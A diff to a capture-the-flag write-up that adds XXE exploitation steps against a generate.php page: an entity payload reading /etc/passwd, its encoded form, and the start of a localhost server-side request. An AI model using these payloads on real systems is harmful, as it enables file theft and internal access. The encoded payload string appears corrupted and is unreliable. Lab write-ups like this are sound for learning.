@@ -46,7 +46,24 @@ The XML object format was this:
 </input>
 ```
 
-Encoded into a URL safe base-64 string, this XML object became this: `PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz4KPGlucHV0PgogIDxmaXJzdE5hbWU%2BZmlyc3ROYW1lPC9maXJzdE5hbWU%2BCiAgPGxhc3ROYW1lPmxhc3ROYW1lPC9sYXN0TmFtZT4KPC9pbnB1dD4%3D`
+Encoded into a URL safe base-64 string, this XML object became this: `PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz4KPGlucHV0PgogIDxmaXJzdE5hbWU%2BZmlyc3ROYW1lPC9maXJzdE5hbWU%2BCiAgPGxhc3ROYW1lPmxhc3ROYW1lPC9sYXN0TmFtZT4KPC9pbnB1dD4%3D` passing that string to the generate.php page as the input parameter successfully rendered the page.
+
+I then tried to pass an XML entity exploit to see if it would yield a result. So, I tried accessing `/etc/passwd`. I used the following XML code:
+
+```xml
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<input>
+  <firstName>Kim</firstName>
+  <lastName>&xxe;</lastName>
+</input>
+```
+
+Which encoded and made URL safe yielded the string: `PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz4KPCFET0NUWtionVBFIGVybncgWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiID4gXT4KPGlucHV0PgogIDxmaXJzdE5hbWU%2BS2ltPC9maXJzdE5hbWU%2BCiAgPGxhc3ROYW1lPiZ4eGU7PC9sYXN0TmFtZT4KPC9pbnB1dD4%3D`. This string, entered into the URL parameter yielded the following result page.
+
+![Screenshot](/ctf/images/pic4.png?raw=true)
+
+This is promising! It shows the contents of `/etc/passwd`. So let;s try to figure out how to get the actual flag. I thought that it might have to do with the aoffrementioned comment on the /generate.php page (that the page needs to be accessed from the webserver to see the secret Hacker Name). So I tried to use the XML function to access a remote host's page by replacing `file:///etc/passwd` with `http://localhost/generate.php`. The final XML string passed was:
 
 
 ```xml
